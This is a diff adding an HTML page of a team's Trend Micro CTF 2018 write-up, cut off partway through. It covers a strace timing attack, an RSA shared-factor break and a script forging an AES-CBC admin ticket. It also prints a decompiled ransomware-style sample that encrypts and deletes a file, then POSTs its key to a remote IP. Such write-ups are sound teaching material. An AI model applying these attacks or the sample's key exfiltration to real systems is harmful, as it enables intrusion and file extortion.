@@ -1,0 +1,1081 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Trend Micro CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                analysis-offensive
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#200">200</a>
+    
+                <a class="dropdown-item" href="#300">300</a>
+    
+                <a class="dropdown-item" href="#400-acme-protocol">400-acme-protocol</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reversing-binary
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#100-(sces60107)">100-(sces60107)</a>
+    
+                <a class="dropdown-item" href="#300-1">300-1</a>
+    
+                <a class="dropdown-item" href="#400">400</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                forensics-crypto1
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#400-1">400-1</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                forensics-crypto2
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#100-(sces60107)-1">100-(sces60107)-1</a>
+    
+                <a class="dropdown-item" href="#200-(sces60107)">200-(sces60107)</a>
+    
+                <a class="dropdown-item" href="#300-2">300-2</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reversing-other
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#100,-200-(sces60107)">100,-200-(sces60107)</a>
+    
+                <a class="dropdown-item" href="#400-(sces60107)">400-(sces60107)</a>
+    
+                <a class="dropdown-item" href="#200-1">200-1</a>
+    
+                <a class="dropdown-item" href="#300-3">300-3</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">analysis-offensive</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#200" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">200</span>
+            </a>
+    
+<a href="#300" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">300</span>
+            </a>
+    
+<a href="#400-acme-protocol" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">400-acme-protocol</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reversing-binary</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#100-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">100-(sces60107)</span>
+            </a>
+    
+<a href="#300-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">300-1</span>
+            </a>
+    
+<a href="#400" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">400</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">forensics-crypto1</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#400-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">400-1</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">forensics-crypto2</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#100-(sces60107)-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">100-(sces60107)-1</span>
+            </a>
+    
+<a href="#200-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">200-(sces60107)</span>
+            </a>
+    
+<a href="#300-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">300-2</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reversing-other</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#100,-200-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">100,-200-(sces60107)</span>
+            </a>
+    
+<a href="#400-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">400-(sces60107)</span>
+            </a>
+    
+<a href="#200-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">200-1</span>
+            </a>
+    
+<a href="#300-3" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">300-3</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="trend-micro-ctf-2018"><a class="header-link" href="#trend-micro-ctf-2018"></a>Trend Micro CTF 2018</h1>
+<h2 id="analysis-offensive"><a class="header-link" href="#analysis-offensive"></a>Analysis-Offensive</h2>
+<h3 id="200"><a class="header-link" href="#200"></a>200</h3>
+<p>We are given a program <code>oracle</code> which reads our input. If our input matches the flag, it outputs <code>True</code>, otherwise, <code>False</code>.</p>
+<p>According to the hints from the description, (1) The program exits as fast as possible. (2) This is not a reverse challenge.</p>
+<p>So, let&#39;s take a look at the system calls it uses:</p>
+<pre class="hljs"><code>$ strace ./oracle TMCTF{
+execve(<span class="hljs-string">"./oracle"</span>, [<span class="hljs-string">"./oracle"</span>, <span class="hljs-string">"TMCTF{"</span>], [<span class="hljs-comment">/* 23 vars */</span>]) = <span class="hljs-number">0</span>
+brk(NULL)                               = <span class="hljs-number">0x146d000</span>
+brk(<span class="hljs-number">0x146e1c0</span>)                          = <span class="hljs-number">0x146e1c0</span>
+arch_prctl(ARCH_SET_FS, <span class="hljs-number">0x146d880</span>)      = <span class="hljs-number">0</span>
+uname({sysname=<span class="hljs-string">"Linux"</span>, nodename=<span class="hljs-string">"ubuntu-xenial"</span>, ...}) = <span class="hljs-number">0</span>
+readlink(<span class="hljs-string">"/proc/self/exe"</span>, <span class="hljs-string">"/home/vagrant/trend/analysis-200"</span>..., <span class="hljs-number">4096</span>) = <span class="hljs-number">39</span>
+brk(<span class="hljs-number">0x148f1c0</span>)                          = <span class="hljs-number">0x148f1c0</span>
+brk(<span class="hljs-number">0x1490000</span>)                          = <span class="hljs-number">0x1490000</span>
+access(<span class="hljs-string">"/etc/ld.so.nohwcap"</span>, F_OK)      = <span class="hljs-number">-1</span> ENOENT (No such file or directory)
+nanosleep({<span class="hljs-number">0</span>, <span class="hljs-number">15000000</span>}, NULL)          = <span class="hljs-number">0</span>
+nanosleep({<span class="hljs-number">0</span>, <span class="hljs-number">15000000</span>}, NULL)          = <span class="hljs-number">0</span>
+nanosleep({<span class="hljs-number">0</span>, <span class="hljs-number">15000000</span>}, NULL)          = <span class="hljs-number">0</span>
+nanosleep({<span class="hljs-number">0</span>, <span class="hljs-number">15000000</span>}, NULL)          = <span class="hljs-number">0</span>
+nanosleep({<span class="hljs-number">0</span>, <span class="hljs-number">15000000</span>}, NULL)          = <span class="hljs-number">0</span>
+nanosleep({<span class="hljs-number">0</span>, <span class="hljs-number">15000000</span>}, NULL)          = <span class="hljs-number">0</span>
+fstat(<span class="hljs-number">1</span>, {st_mode=S_IFCHR|<span class="hljs-number">0620</span>, st_rdev=makedev(<span class="hljs-number">136</span>, <span class="hljs-number">0</span>), ...}) = <span class="hljs-number">0</span>
+write(<span class="hljs-number">1</span>, <span class="hljs-string">"False<span class="hljs-subst">\n</span>"</span>, <span class="hljs-number">6</span>False
+)                  = <span class="hljs-number">6</span>
+exit_group(<span class="hljs-number">0</span>)                           = ?
++++ exited with <span class="hljs-number">0</span> +++</code></pre><p>Nice, it sleeps six times when the first six characters are correct. Here is our script:</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> subprocess
+<span class="hljs-keyword">import</span> string
+
+flag = <span class="hljs-string">'TMCTF{'</span>
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'{}_'</span>:
+        batcmd = <span class="hljs-string">'/usr/bin/strace ./oracle "{}" 2&gt;&amp;1'</span>.format(flag + c)
+        result = subprocess.check_output(batcmd, shell=<span class="hljs-keyword">True</span>)
+        <span class="hljs-keyword">if</span> result.count(<span class="hljs-string">'nano'</span>) == len(flag) + <span class="hljs-number">1</span>:
+            flag += c
+            <span class="hljs-keyword">break</span>
+    print(flag)</code></pre><p>FLAG: <code>TMCTF{WatchTh3T1m3}</code></p>
+<h3 id="300"><a class="header-link" href="#300"></a>300</h3>
+<p>We are given three people&#39;s public keys and the messages for them respectively. For example,</p>
+<pre class="hljs"><code>message <span class="hljs-keyword">for</span> Alice:
+18700320110367574655449823553009212724937318442101140581378358928204994827498139841897479168675123789374462637095265564472109735802305521045676412446455683615469865332270051569768255072111079626023422
+
+Alice's <span class="hljs-keyword">public</span> key (e,N):
+( 65537 , 23795719145225386804055015945976331504878851440464956768596487167710701468817080174616923533397144140667518414516928416724767417895751634838329442802874972281385084714429143592029962130216053890866347 )</code></pre><p>It turns out that any two of the module <code>N</code>s has a common factor, thus they all can be factorized.</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *
+
+...
+
+g_ab = gcd(a_N, b_N)
+g_bc = gcd(b_N, c_N)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(msg, p, q, N)</span>:</span>
+    phi_n = (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)
+    d = invert(<span class="hljs-number">65537</span>, phi_n)
+    msg = pow(msg, d, N)
+    print(int2text(msg))
+
+decrypt(a_msg, g_ab, a_N/g_ab, a_N)
+decrypt(b_msg, g_ab, b_N/g_ab, b_N)
+decrypt(c_msg, g_bc, c_N/g_bc, c_N)</code></pre><p>Hmm... is it worth 300 points?
+FLAG: <code>TMCTF{B3Car3fu11Ab0utTh3K3ys}</code></p>
+<h3 id="400-acme-protocol"><a class="header-link" href="#400-acme-protocol"></a>400 ACME Protocol</h3>
+<p>We are given a protocol and some reference implementation in Python. The author of this challenge is so kind. Even a protocol spec is given! so let&#39;s take a closer look at the protocol to find the vulnerability.</p>
+<p>First, our objective is obvious: run <code>getflag</code> as <code>admin</code></p>
+<pre class="hljs"><code><span class="hljs-number">4.6</span> COMMAND (Message Type <span class="hljs-number">0x06</span>)
+
+Message Format: Client -&gt; <span class="hljs-built_in">Server</span>: <span class="hljs-number">0x06</span> | Ticket | Command
+
+Explanation: Client requests execution of the command specified by the <span class="hljs-built_in">string</span> Command. Ticket must be a valid, current ticket received via a LOGON_SUCCESS message.
+
+Processing: The <span class="hljs-built_in">server</span> executes the following algorithm upon receipt:
+
+<span class="hljs-keyword">Set</span> D = Decrypt(Base64Decode(Ticket), KS)
+Scan D sequentially as follows:
+<span class="hljs-keyword">Set</span> IdentityFromTicket = JSON <span class="hljs-built_in">string</span> (UTF<span class="hljs-number">-8</span>, <span class="hljs-literal">null</span>-terminated)
+<span class="hljs-keyword">Set</span> Timestamp = <span class="hljs-number">8</span> bytes
+<span class="hljs-keyword">If</span> Timestamp <span class="hljs-keyword">is</span> too old (&gt; <span class="hljs-number">1</span> <span class="hljs-built_in">hour</span>):
+    Respond <span class="hljs-keyword">with</span> message AUTHX_FAILURE
+    <span class="hljs-keyword">End</span>
+<span class="hljs-keyword">Set</span> U <span class="hljs-keyword">to</span> the <span class="hljs-built_in">string</span> IdentityFromTicket.user
+Iterate over IdentityFromTicket.groups, collecting the results into an <span class="hljs-built_in">array</span> of strings, G
+<span class="hljs-keyword">Set</span> Identity = object expressing U <span class="hljs-keyword">and</span> G
+<span class="hljs-keyword">If</span> Command = “whoami”:
+    <span class="hljs-keyword">Set</span> Result = JSON <span class="hljs-built_in">string</span>: { user: Identity.U, groups: [ G1, G2, ... ] }
+        where G1, G2, ... are the elements of Identity.G
+<span class="hljs-keyword">Else</span> <span class="hljs-keyword">If</span> Command = “getflag”:
+    <span class="hljs-keyword">If</span> G contains the <span class="hljs-built_in">string</span> “admin”:
+        <span class="hljs-keyword">Set</span> Result = CTF flag
+    <span class="hljs-keyword">Else</span>:
+        Respond <span class="hljs-keyword">with</span> message AUTHX_FAILURE
+        <span class="hljs-keyword">End</span>
+<span class="hljs-keyword">Else</span>:
+    Respond <span class="hljs-keyword">with</span> message AUTHX_FAILURE
+    <span class="hljs-keyword">End</span>
+Respond <span class="hljs-keyword">with</span> message COMMAND_RESULT(Result)</code></pre><p>Okay, the next problem is how to generate a valid <code>IdentityFromTicket</code>, which is a JSON string encrypted by KS (server key)? What we want to do is to send <code>Encrypt({&quot;user&quot;:&quot;admin&quot;,&quot;groups&quot;:[&quot;admin&quot;]} | timestamp)</code>. Note that in this challenge we don&#39;t even have a valid guest account to login. </p>
+<p>Of course we don&#39;t have the server key, but can we abuse other command to manipulate the payload? Let&#39;s take a look at LOGON_REQUEST:</p>
+<pre class="hljs"><code><span class="hljs-number">4.1</span> LOGON_REQUEST (Message <span class="hljs-keyword">Type</span> <span class="hljs-number">0x01</span>)
+
+Message format: Client -&gt; Server: <span class="hljs-number">0x01</span> | <span class="hljs-type">U</span>
+
+Explanation: The client sends this message to the server to initiate authentication <span class="hljs-built_in">with</span> username U.
+
+Processing: The server executes the following algorithm upon receipt:
+
+<span class="hljs-keyword">Set</span> Nonce = <span class="hljs-number">8</span>-byte random nonce
+<span class="hljs-keyword">Set</span> Timestamp = current timestamp
+<span class="hljs-keyword">Set</span> ChallengeCookie = Base64Encode(Encrypt(Nonce | <span class="hljs-type">U</span> | <span class="hljs-type">Timestamp</span>, KS))
+Respond <span class="hljs-built_in">with</span> message LOGON_CHALLENGE(Nonce, ChallengeCookie)</code></pre><p>Basically the server will encrypt user-provided U (username), and we&#39;ll get the ciphertext of <code>Encrypt(Nonce | U | Timestamp)</code>.</p>
+<p>It&#39;s apparent that <code>Encrypt(Nonce | U | Timestamp)</code> is similar to what we need, <code>Encrypt({&quot;user&quot;:&quot;admin&quot;,&quot;groups&quot;:[&quot;admin&quot;]} | timestamp)</code>.  However, how to get rid of the nonce?</p>
+<p>Since the encryption uses AES-128-CBC, it&#39;s feasible to truncate the nonce! </p>
+<p>The idea is simple: we&#39;ll let the server encrypt the following payload:</p>
+<pre class="hljs"><code><span class="hljs-keyword">block </span><span class="hljs-number">0</span>: <span class="hljs-number">8</span>-<span class="hljs-keyword">byte </span>nonce + <span class="hljs-number">8</span>-<span class="hljs-keyword">byte </span>garbage
+<span class="hljs-keyword">block </span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>: <span class="hljs-number">16</span> * <span class="hljs-number">3</span> <span class="hljs-keyword">bytes </span><span class="hljs-keyword">JSON </span>string
+<span class="hljs-keyword">block </span><span class="hljs-number">4</span>: <span class="hljs-number">8</span>-<span class="hljs-keyword">byte </span>timestamp + <span class="hljs-number">8</span>-<span class="hljs-keyword">byte </span>PKCS<span class="hljs-comment">#7 padding</span></code></pre><p>and we&#39;ll truncate the first block.</p>
+<p>Here is the attack script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> base64
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span><span class="hljs-params">(s)</span>:</span>
+    sock.send(s)
+    print(f<span class="hljs-string">'[&lt;-send] {s}'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv</span><span class="hljs-params">()</span>:</span>
+    s = sock.recv(<span class="hljs-number">2</span>**<span class="hljs-number">14</span>)
+    print(f<span class="hljs-string">'[recv-&gt;] {repr(s)}'</span>)
+    <span class="hljs-keyword">return</span> s
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((<span class="hljs-string">"localhost"</span>, <span class="hljs-number">9999</span>))
+
+payload = <span class="hljs-string">'{"user":"admin","groups":["admin", "aaaaaaaaa"]}'</span>
+<span class="hljs-keyword">assert</span> len(payload) == <span class="hljs-number">16</span> * <span class="hljs-number">3</span>
+send(<span class="hljs-string">b'\x01garbage!'</span> + payload.encode() + <span class="hljs-string">b'\x00'</span>)
+<span class="hljs-comment"># 0x02 | 8 byte Nonce | ChallengeCookie (null byte terminated)</span>
+enc = base64.b64decode(recv()[<span class="hljs-number">1</span>+<span class="hljs-number">8</span>:<span class="hljs-number">-1</span>])
+<span class="hljs-comment"># enc: 6 blocks: iv | (8 byte Nonce | 8 byte garbage!) | 48 bytes payload | Timestamp</span>
+<span class="hljs-keyword">assert</span> len(enc) == <span class="hljs-number">16</span> * <span class="hljs-number">6</span>
+
+<span class="hljs-comment">#0x06 | Ticket | Command</span>
+send(<span class="hljs-string">b'\x06'</span> + base64.b64encode(enc[<span class="hljs-number">16</span>:]) + <span class="hljs-string">b'\x00'</span> + <span class="hljs-string">b'getflag\x00'</span>)
+print(recv())
+<span class="hljs-comment"># TMCTF{90F41EF71ED5}</span>
+sock.close()</code></pre><p>I guess some teams retrieve the flag using reverse skills, though the author claimed it&#39;s heavily obfuscated.</p>
+<p>In real world, there are lots of protocols and it&#39;s really important to ensure every step is secure. IMO this challenge is well-designed and very interesting! I really enjoyed it. Thanks to the author for such a practical challenge. </p>
+<h2 id="reversing-binary"><a class="header-link" href="#reversing-binary"></a>Reversing-Binary</h2>
+<h3 id="100-(sces60107)"><a class="header-link" href="#100-(sces60107)"></a>100 (sces60107)</h3>
+<ol class="list">
+<li>Use PyInstaller Extractor v1.9 and uncompyle2</li>
+<li>Now we have this source code
+<code>`</code>python=
+import struct, os, time, threading, urllib, requests, ctypes, base64
+from Cryptodome.Random import random
+from Cryptodome.Cipher import AES, ARC4
+from Cryptodome.Hash import SHA
+infile = &#39;EncryptMe1234.txt&#39;
+encfile = &#39;EncryptMe1234.txt.CRYPTED&#39;
+keyfile = &#39;keyfile&#39;
+sz = 1024
+bs = 16
+passw = &#39;secretpassword&#39;
+URL = &#39;<a href="http://192.168.107.14&#39;">http://192.168.107.14&#39;</a>
+rkey = &#39;secretkey&#39;
+key = os.urandom(bs)
+iv = os.urandom(bs)</li>
+</ol>
+<p>def callbk():
+    global rkey
+    global passw
+    global iv
+    global key
+    id = 0
+    n = 0
+    while id == 0 or n == 0 and n &lt; 256:
+        id = os.urandom(1)
+        n = hex(ord(id) + bs)</p>
+<pre class="hljs"><code>id = id.encode(<span class="hljs-string">'hex'</span>)
+<span class="hljs-keyword">for</span> c in passw:
+    passw = ''.join(chr(ord(c) ^ <span class="hljs-keyword">int</span>(n, 16)))
+
+key = ''.join((chr(ord(x) ^ <span class="hljs-keyword">int</span>(n, 16)) <span class="hljs-keyword">for</span> x in key))
+<span class="hljs-keyword">for</span> c in rkey:
+    rkey = ''.join(chr(ord(c) ^ <span class="hljs-keyword">int</span>(n, 16)))
+
+iv = ''.join((chr(ord(y) ^ <span class="hljs-keyword">int</span>(n, 16)) <span class="hljs-keyword">for</span> y in iv))
+key = key.encode('hex')
+iv = iv.encode('hex')
+Headers = {<span class="hljs-string">'Content-Type'</span>: 'application/x-www-form-urlencoded',
+ 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36'}
+params = urllib.urlencode({<span class="hljs-string">'id'</span>: id,
+ 'key': key,
+ 'iv': iv})
+rnum = os.urandom(bs)
+khash = SHA.<span class="hljs-keyword">new</span>(rnum).digest()
+cipher1 = ARC4.<span class="hljs-keyword">new</span>(khash)
+khash = khash.encode('hex')
+msg = cipher1.encrypt(params)
+msg = base64.b64encode(khash + msg.encode('hex'))
+response = requests.post(url=URL, data=msg, headers=Headers)
+del key
+del iv
+ctypes.windll.user32.MessageBoxA(0, 'Your file <span class="hljs-string">"EncryptMe1234.txt"</span> has been encrypted. Obtain your <span class="hljs-string">"keyfile"</span> to decrypt your file.', 'File(s) Encrypted!!!', 1)</code></pre><p>def encrypt():
+    global encfile
+    global infile
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    if os.path.exists(infile):
+        fin = open(infile, &#39;r&#39;)
+        fout = open(encfile, &#39;w&#39;)
+        fsz = os.path.getsize(infile)
+        fout.write(struct.pack(&#39;&lt;H&#39;, fsz))
+        while True:
+            data = fin.read(sz)
+            n = len(data)
+            if n == 0:
+                break
+            elif n % bs != 0:
+                data += &#39;0&#39; * (bs - n % bs)
+            crypt = aes.encrypt(data)
+            fout.write(crypt)</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">fin</span>.<span class="hljs-keyword">close</span>()
+    fout.<span class="hljs-keyword">close</span>()
+    os.<span class="hljs-built_in">remove</span>(infile)
+    callbk()
+<span class="hljs-keyword">else</span>:
+    <span class="hljs-keyword">return</span></code></pre><p>def decrypt():
+    global keyfile
+    key = &#39;&#39;
+    iv = &#39;&#39;
+    if not os.path.exists(encfile):
+        exit(0)
+    while True:
+        time.sleep(10)
+        if os.path.exists(keyfile):
+            keyin = open(keyfile, &#39;rb&#39;)
+            key = keyin.read(bs)
+            iv = keyin.read(bs)
+            if len(key) != 0 and len(iv) != 0:
+                aes = AES.new(key, AES.MODE_CBC, iv)
+                fin = open(encfile, &#39;r&#39;)
+                fsz = struct.unpack(&#39;&lt;H&#39;, fin.read(struct.calcsize(&#39;&lt;H&#39;)))[0]
+                fout = open(infile, &#39;w&#39;)
+                fin.seek(2, 0)
+                while True:
+                    data = fin.read(sz)
+                    n = len(data)
+                    if n == 0:
+                        break
+                    decrypted = aes.decrypt(data)
+                    n = len(decrypted)
+                    if fsz &gt; n:
+                        fout.write(decrypted)
+                    else:
+                        fout.write(decrypted[:fsz])
+                    fsz -= n</p>
+<pre class="hljs"><code>            <span class="hljs-keyword">fin</span>.<span class="hljs-keyword">close</span>()
+            os.<span class="hljs-built_in">remove</span>(encfile)
+            <span class="hljs-keyword">break</span></code></pre><p>def main():
+    encrypt()
+    t2 = threading.Thread(target=decrypt, args=())
+    t2.start()
+    t2.join()</p>
+<p>if <strong>name</strong> == &#39;<strong>main</strong>&#39;:
+    main()</p>
+<pre class="hljs"><code><span class="hljs-number">3.</span> Extract information from filecrypt.pcap <span class="hljs-literal">and</span> decrypt the message <span class="hljs-keyword">then</span> get this <span class="hljs-built_in">string</span> `id=d1&amp;key=<span class="hljs-number">2</span>f87011fadc6c2f7376117867621b606&amp;iv=<span class="hljs-number">95</span>bc0ed56ab0e730b64cce91c9fe9390`
+<span class="hljs-number">4.</span> But these are <span class="hljs-literal">not</span> the original key <span class="hljs-literal">and</span> the original iv. Take a look of this part of code, <span class="hljs-keyword">then</span> you can recover the original key <span class="hljs-literal">and</span> the original iv
+```python
